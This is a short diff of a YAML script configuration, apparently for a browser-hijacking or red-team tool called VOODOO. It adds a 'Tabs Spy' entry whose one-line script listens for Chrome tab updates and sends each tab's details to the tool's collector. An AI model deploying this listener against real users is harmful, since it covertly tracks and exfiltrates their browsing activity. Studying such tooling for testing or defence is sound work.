@@ -1,6 +1,8 @@
-output: stdout:payload # prints the event[:payload]
+info:
+  name: Tabs Spy
+  author: Mr. Test
 
-output: stdout:payload
+output: payload
 
 scripts:
   - content: chrome.tabs.onUpdated.addListener((_,tab) => VOODOO.send(tab));
